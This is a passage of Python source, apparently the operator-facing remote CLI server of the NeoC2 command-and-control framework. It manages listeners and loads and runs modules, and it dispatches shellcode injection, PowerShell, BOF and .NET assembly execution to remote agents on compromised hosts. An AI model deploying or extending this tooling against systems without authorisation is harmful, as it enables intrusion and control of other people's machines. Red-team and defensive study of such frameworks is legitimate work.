import socket
import ssl
import json
import threading
import time
import uuid
import os
import subprocess
import tempfile
import base64
import shutil
import zipfile
import io
from datetime import datetime, timedelta
import hashlib
import random
import string
from core.models import NeoC2DB
from core.config import NeoC2Config
from teamserver.module_manager import ModuleManager
from teamserver.listener_manager import ListenerManager
from teamserver.agent_manager import AgentManager
from teamserver import help
import logging
from teamserver.user_manager import UserManager
from teamserver.multiplayer_coordinator import MultiplayerCoordinator
from teamserver.session_manager import SessionManager
from teamserver.audit_logger import AuditLogger

from communication.encryption import EncryptionManager

from agents.stager_interactive import handle_interactive_stager_command

class TerminalSession:
    def __init__(self, session_id, user_id, username, agent_manager):
        self.session_id = session_id
        self.user_id = user_id
        self.username = username
        self.command_history = []
        self.created_at = datetime.now()
        self.last_activity = datetime.now()
        self.current_agent = None
        self.current_target = None
        self.interactive_mode = False
        self.persistence_enabled = False
        self.stager_manager = None
        self.payload_manager = None
        self.agent_manager = agent_manager
        self.persistence_instances = {}  
        self.module_manager = None  # Will be initialized when needed
        
    def add_command(self, command, result, status='completed'):
        self.command_history.append({
            'id': str(uuid.uuid4()),
            'command': command,
            'result': result,
            'status': status,
            'timestamp': datetime.now().isoformat(),
            'execution_time': None
        })
        self.last_activity = datetime.now()
        
    def get_history(self, limit=50):
        return self.command_history[-limit:]


class RemoteCLIServer:
    
    def __init__(self, config, db, agent_manager, listener_manager=None, multiplayer_coordinator=None, audit_logger=None):
        self.config = config
        self.db = db
        self.agent_manager = agent_manager
        self.listener_manager = listener_manager
        self.multiplayer_coordinator = multiplayer_coordinator
        self.audit_logger = audit_logger  # Add audit logger
        self.user_manager = UserManager(db)
        self.logger = logging.getLogger(f'{__name__}.{self.__class__.__name__}')
        
        self.active_sessions = {}
        self.running = False
        self.server_socket = None
        
        self.connected_clients = {}  # session_id to socket
        
        self.auth_tokens = {}  # token -> session info
        self.client_sessions = {}  # session_id -> socket info
        
        self.host = config.get('remote_cli.host', '0.0.0.0')
        self.port = config.get('remote_cli.port', 8444)
        self.ssl_enabled = config.get('remote_cli.ssl_enabled', True)
        self.cert_file = config.get('remote_cli.cert_file', 'server.crt')
        self.key_file = config.get('remote_cli.key_file', 'server.key')
        
        self.module_manager = ModuleManager(config, db)
        self.module_manager.load_all_modules()
        self.module_manager.load_modules_from_db()
        
        self._encryption_manager = EncryptionManager(config={})
        
        if self.agent_manager:
            self.agent_manager.register_interactive_result_callback(self.broadcast_interactive_result)
            self.agent_manager.register_agent_callback(self.broadcast_agent_update)

        # Start the agent broadcast thread
        self._start_agent_broadcast_thread()
    
    def _start_agent_broadcast_thread(self):
        self.agent_broadcast_stop_event = threading.Event()
        self.agent_broadcast_thread = threading.Thread(target=self._agent_broadcast_worker)
        self.agent_broadcast_thread.daemon = True
        self.agent_broadcast_thread.start()
        self.logger.info("Agent broadcast thread started")

    def _stop_agent_broadcast_thread(self):
        if hasattr(self, 'agent_broadcast_stop_event'):
            self.agent_broadcast_stop_event.set()
        if hasattr(self, 'agent_broadcast_thread') and self.agent_broadcast_thread.is_alive():
            self.agent_broadcast_thread.join(timeout=2)

    def _agent_broadcast_worker(self):
        while not self.agent_broadcast_stop_event.is_set():
            try:
                self.broadcast_all_agents_to_all_clients()

                # Wait for 2 seconds before next broadcast
                if self.agent_broadcast_stop_event.wait(timeout=2):
                    break  # Stop event was set, exit the loop

            except Exception as e:
                self.logger.error(f"Error in agent broadcast worker: {str(e)}")
                # Wait a bit before continuing to avoid tight loop on errors
                if self.agent_broadcast_stop_event.wait(timeout=1):
                    break

    def get_or_create_session(self, user_id, username, agent_manager):
        session_id = str(uuid.uuid4())
        session = TerminalSession(session_id, user_id, username, agent_manager)
        session.module_manager = self.module_manager  # Assign the shared module manager
        return session
    
    def handle_listener_command(self, command_parts, listener_manager=None):
        if len(command_parts) < 2:
            return help.get_listener_help_display(), 'info'
        
        action = command_parts[1].lower()

        if listener_manager is None:
            listener_manager = self.listener_manager

        if listener_manager is None:
            return "Listener manager is not initialized", 'error'

        if action == 'create':
            if len(command_parts) < 5:
                return "Example format: listener create myhttp http 8081", 'error'
            
            listener_name = command_parts[2]
            
            options = {}
            port = None
            listener_type = None
            
            if '=' in command_parts[3]:
                for part in command_parts[3:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        if key == 'type':
                            listener_type = value
                        elif key == 'port':
                            port = value
                        else:
                            options[key] = value
                    elif port is None:
                        port = part
                    else:
                        return "Invalid command format. Use: listener create <name> type=<type> <port> [options]", 'error'
            else:
                listener_type = command_parts[3]
                port = command_parts[4]
                for part in command_parts[5:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
                    else:
                        if 'host' not in options:
                            options['host'] = part

            if not listener_type or not port:
                return "Listener type and port are required.", 'error'

            try:
                if listener_type.lower() != 'icmp':
                    try:
                        port = int(port)
                        if not (1 <= port <= 65535):
                            return "Port must be between 1 and 65535", 'error'
                    except ValueError:
                        return f"Invalid port number: {port}", 'error'
                
                result = listener_manager.create_listener(
                    listener_type.lower(),
                    name=listener_name,
                    host=options.get('host', '0.0.0.0'),
                    port=port if listener_type.lower() != 'icmp' else None,
                    profile_name=options.get('profile_name', 'default'),
                )
                
                if result.get('success', False):
                    return result.get('message', f"Listener '{listener_name}' created successfully"), 'success'
                else:
                    return f"Failed to create listener: {result.get('error', 'Unknown error')}", 'error'
                        
            except Exception as e:
                return f"Error creating listener: {str(e)}", 'error'

        elif action in ['start', 'stop', 'restart', 'delete']:
            if len(command_parts) < 3:
                return f"USAGE: listener {action} <listener_name>", 'error'
            
            listener_name = command_parts[2]
            
            try:
                listener = self.db.get_listener_by_name(listener_name)
                
                if not listener:
                    return f"Listener '{listener_name}' not found. Use 'listener list' to see available listeners.", 'error'
                
                if action == 'start':
                    result = listener_manager.start_listener(listener['id'])
                    message = result.get('message', f"Listener '{listener_name}' started")
                elif action == 'stop':
                    result = listener_manager.stop_listener(listener['id'])
                    message = result.get('message', f"Listener '{listener_name}' stopped")
                elif action == 'delete':
                    result = listener_manager.delete_listener(listener['id'])
                    message = f"Listener '{listener_name}' deleted successfully"
                elif action == 'restart':
                    stop_result = listener_manager.stop_listener(listener['id'])
                    if not stop_result.get('success', False):
                        return f"Failed to stop listener for restart: {stop_result.get('error', 'Unknown error')}", 'error'
                    
                    import time
                    time.sleep(0.5) # Allow time for socket cleanup
                    
                    result = listener_manager.start_listener(listener['id'])
                    message = f"Listener '{listener_name}' restarted successfully"

                if result.get('success', False):
                    return message, 'success'
                else:
                    return f"Failed to {action} listener: {result.get('error', 'Unknown error')}", 'error'
                    
            except Exception as e:
                return f"Error with '{action}' command: {str(e)}", 'error'
        
        elif action == 'list':
            try:
                result = listener_manager.list_listeners()
                if not result.get('success', False):
                    return f"Failed to list listeners: {result.get('error', 'Unknown error')}", 'error'
                
                listeners = result.get('listeners', [])
                if not listeners:
                    return "No listeners found.", 'info'
                
                output = "Active Listeners:\n" + ("-" * 125) + "\n"
                output += f"{'Name':<15} {'Type':<8} {'Host':<15} {'Port':<6} {'Profile':<20} {'Status':<10} {'ID':<36}\n"
                output += ("-" * 125) + "\n"

                for listener in listeners:
                    port_str = str(listener['port']) if listener['port'] else 'N/A'
                    profile = listener.get('profile_name', 'default')
                    output += f"{listener['name']:<15} {listener['type']:<8} {listener['host']:<15} {port_str:<6} {profile:<20} {listener['status']:<10} {listener['id']:<36}\n"
                
                return output, 'success'
                    
            except Exception as e:
                return f"Error listing listeners: {str(e)}", 'error'
                
        else:
            return f"Unknown action: {action}. Available: create, list, start, stop, restart, delete", 'error'

    def handle_modules_command(self, command_parts, session):
        if len(command_parts) < 2:
            return help.get_modules_help_display(), 'info'
        
        action = command_parts[1].lower()
        
        if action == 'list':
            try:
                module_manager = self.module_manager
                module_manager.load_all_modules()

                modules_list = module_manager.list_modules()  # Call the method

                if not modules_list:
                    return "No modules found. Place modules in the modules/ directory.", 'info'

                output = "Available Modules:\n"
                output += "-" * 120 + "\n"
                output += f"{'Name':<25} {'Type':<15} {'Technique ID':<15} {'MITRE Tactics':<25} {'Description':<35}\n"
                output += "-" * 120 + "\n"

                for module_info in modules_list:
                    name = module_info.get('name', 'Unknown')
                    module_type = module_info.get('type', 'unknown')
                    technique_id = module_info.get('technique_id', 'unknown')
                    mitre_tactics = ', '.join(module_info.get('mitre_tactics', []))
                    description = module_info.get('description', 'No description')

                    # Truncate fields if too long
                    if len(name) > 24:
                        name = name[:22] + ".."
                    if len(module_type) > 14:
                        module_type = module_type[:12] + ".."
                    if len(technique_id) > 14:
                        technique_id = technique_id[:12] + ".."
                    if len(mitre_tactics) > 24:
                        mitre_tactics = mitre_tactics[:22] + ".."
                    if len(description) > 34:
                        description = description[:32] + ".."

                    output += f"{name:<25} {module_type:<15} {technique_id:<15} {mitre_tactics:<25} {description:<35}\n"

                return output, 'success'

            except Exception as e:
                return f"Error listing modules: {str(e)}", 'error'
        
        elif action == 'load':
            if len(command_parts) < 3:
                return "Usage: modules load <module_path>", 'error'
            
            module_path = command_parts[2]
            
            try:
                module_manager = self.module_manager
                
                if module_manager.load_module(module_path):
                    return f"Module '{module_path}' loaded successfully", 'success'
                else:
                    return f"Failed to load module: {module_path}", 'error'
                    
            except Exception as e:
                return f"Error loading module: {str(e)}", 'error'
        
        elif action == 'info':
            if len(command_parts) < 3:
                return """
                USAGE:
                modules info <module_name>""", 'error'
            
            module_name = command_parts[2]
            
            try:
                loaded_modules_dict = getattr(self.module_manager, 'loaded_modules', {})
                
                if module_name not in loaded_modules_dict:
                    self.module_manager.load_all_modules()
                    self.module_manager.load_modules_from_db()
                    
                    loaded_modules_dict = getattr(self.module_manager, 'loaded_modules', {})
                    
                    if module_name not in loaded_modules_dict:
                        module_info = self.module_manager.db.execute(
                            "SELECT id, name, description, type, technique_id, mitre_tactics FROM modules WHERE name = ?",
                            (module_name,)
                        ).fetchone()
                        
                        if module_info:
                            path_row = self.module_manager.db.execute(
                                "SELECT path FROM modules WHERE name = ?",
                                (module_name,)
                            ).fetchone()
                            
                            if path_row and path_row['path'] and os.path.exists(path_row['path']):
                                import importlib.util
                                spec = importlib.util.spec_from_file_location(module_name, path_row['path'])
                                temp_module = importlib.util.module_from_spec(spec)
                                spec.loader.exec_module(temp_module)
                                
                                if hasattr(temp_module, 'get_info'):
                                    module_info = temp_module.get_info()
                                    loaded_modules_dict[module_name] = {
                                        'module': temp_module,
                                        'info': module_info,
                                        'path': path_row['path']
                                    }
                                else:
                                    return f"Module {module_name} found in DB but has no get_info function", 'error'
                            else:
                                return f"Module {module_name} found in DB but path not available", 'error'
                        else:
                            return f"Module not found: {module_name}", 'error'
                
                module_info = loaded_modules_dict[module_name]['info']
                
                output = f"Module Information: {module_info.get('name', 'Unknown')}\n"
                output += "=" * 80 + "\n"
                output += f"Description: {module_info.get('description', 'No description')}\n"
                output += f"Type: {module_info.get('type', 'Unknown')}\n"
                output += f"Platform: {module_info.get('platform', 'Unknown')}\n"
                output += f"Author: {module_info.get('author', 'Unknown')}\n"
                output += f"References: {', '.join(module_info.get('references', []))}\n"
                
                if 'options' in module_info:
                    output += "\nOptions:\n"
                    for opt_name, opt_info in module_info['options'].items():
                        output += f"  {opt_name}: {opt_info.get('description', 'No description')}\n"
                        if opt_info.get('required', False):
                            output += "    (Required)\n"
                        if 'default' in opt_info:
                            output += f"    Default: {opt_info['default']}\n"
                
                return output, 'success'
                    
            except Exception as e:
                return f"Error getting module info: {str(e)}", 'error'
        
        elif action == 'check':
            if len(command_parts) < 3:
                return "USAGE: modules check <module_path>"
                
            module_path = command_parts[2]
            try:
                module_manager = self.module_manager

                is_compatible, message = module_manager.check_module_compatibility(module_path)
                if is_compatible:
                    return f" Module '{module_path}' is compatible\n{message}", 'success'
                else:
                    return f" Module '{module_path}' is NOT compatible\n{message}", 'error'
            except Exception as e:
                return f"Error checking module: {str(e)}", 'error'
        
        else:
            return f"Unknown modules action: {action}. Use: list, load, info, check", 'error'

    def handle_run_command(self, command_parts, session):
        if len(command_parts) < 2:
            return help.get_run_help_display(), 'info'

        module_name = command_parts[1]

        try:
            db = session.agent_manager.db if session.agent_manager else self.db

            module_manager = self.module_manager

            options = {}
            for part in command_parts[2:]:
                if '=' in part:
                    key, value = part.split('=', 1)
                    options[key] = value

            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            wait_timeout = int(options.get('wait_timeout', 0))

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    module_manager.load_module(module_path)
                    loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})  # Get module info for validation

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    agent_id = options.get('agent_id')
                    if agent_id:
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Determine the command to execute by inspecting what the module would do
                            # For this, we need to modify the approach - let's first call the module
                            # to get the command it would queue, then execute it interactively instead

                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')
                                return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')

                            if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                task_id = result['task_id']
                                agent_id = options.get('agent_id')
                                if not agent_id:
                                    return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                # Poll task status
                                import time
                                start_time = time.time()
                                while time.time() - start_time < wait_timeout:
                                    task_data = db.execute(
                                        "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                        (task_id, agent_id)
                                    ).fetchone()
                                    if task_data and task_data['status'] == 'completed':
                                        return f"Task {task_id} completed: {task_data['result']}", 'success'
                                    time.sleep(1)  # Poll every second

                                return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                            return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running module: {str(e)}", 'error'

    def handle_pinject_command(self, command_parts, session):
        module_name = "pinject"

        if len(command_parts) < 2:
            return "USAGE: pinject <shellcode> [agent_id=<agent_id>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

            if '=' in command_parts[1]:
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                shellcode_input = command_parts[1]
                options['shellcode'] = shellcode_input

                for part in command_parts[2:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value

            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            wait_timeout = int(options.get('wait_timeout', 0))

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    agent_id = options.get('agent_id')
                    if agent_id:
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')
                                return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')

                            if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                task_id = result['task_id']
                                agent_id = options.get('agent_id')
                                if not agent_id:
                                    return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                import time
                                start_time = time.time()
                                while time.time() - start_time < wait_timeout:
                                    task_data = db.execute(
                                        "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                        (task_id, agent_id)
                                    ).fetchone()
                                    if task_data and task_data['status'] == 'completed':
                                        return f"Task {task_id} completed: {task_data['result']}", 'success'
                                    time.sleep(1)

                                return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                            return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running pinject: {str(e)}", 'error'

    def handle_pwsh_command(self, command_parts, session):
        module_name = "pwsh"

        if len(command_parts) < 2:
            return "USAGE: pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

            if '=' in command_parts[1]:
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                script_path = command_parts[1]
                options['script_path'] = script_path

                for part in command_parts[2:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value

            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            wait_timeout = int(options.get('wait_timeout', 0))

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    agent_id = options.get('agent_id')
                    if agent_id:
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')
                                return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')

                            if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                task_id = result['task_id']
                                agent_id = options.get('agent_id')
                                if not agent_id:
                                    return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                import time
                                start_time = time.time()
                                while time.time() - start_time < wait_timeout:
                                    task_data = db.execute(
                                        "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                        (task_id, agent_id)
                                    ).fetchone()
                                    if task_data and task_data['status'] == 'completed':
                                        return f"Task {task_id} completed: {task_data['result']}", 'success'
                                    time.sleep(1)

                                return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                            return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running pwsh: {str(e)}", 'error'

    def handle_inline_execute_command(self, command_parts, session):  # Changed function name from handle_coff_loader_command to handle_inline_execute_command
        module_name = "inline-execute"

        if len(command_parts) < 2:
            return "USAGE: inline-execute <bof_path> [arguments] [agent_id=<agent_id>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

            # Parse command arguments - handle both positional and key-value format
            if '=' in command_parts[1] and 'agent_id=' in command_parts[1]:
                # Handle format like: inline-execute agent_id=abc-123-def bof_path
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                # Handle format: inline-execute bof_path [arguments] [agent_id=value]
                bof_path = command_parts[1]
                options['bof_path'] = bof_path

                # Look for agent_id in remaining arguments
                arguments = []
                i = 2
                while i < len(command_parts):
                    part = command_parts[i]
                    if '=' in part and part.startswith('agent_id='):
                        key, value = part.split('=', 1)
                        options['agent_id'] = value
                    else:
                        arguments.append(part)
                    i += 1

                if arguments:
                    options['arguments'] = ' '.join(arguments)

            # If in interactive mode and no agent_id specified, use the current agent
            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            # Validate that we have an agent_id
            if 'agent_id' not in options:
                return "No agent_id specified and not in interactive mode", 'error'

            agent_id = options['agent_id']
            if session.agent_manager.is_agent_locked_interactively(agent_id):
                lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                if lock_info and lock_info['operator'] != session.username:
                    return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))

                                    # Return both the output and task ID if available (like pinject)
                                    if 'task_id' in result:
                                        return f"{output} (Task ID: {result['task_id']})", status
                                    else:
                                        return output, status
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')
                                    return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))

                                # Return both the output and task ID if available (like pinject)
                                if 'task_id' in result:
                                    return f"{output} (Task ID: {result['task_id']})", status
                                else:
                                    return output, status
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')
                                return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running inline-execute: {str(e)}", 'error'

    def handle_inline_execute_assembly_command(self, command_parts, session):
        module_name = "inline-assembly"

        if len(command_parts) < 2:
            return "USAGE: inline-execute-assembly <assembly_path> [agent_id=<agent_id>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

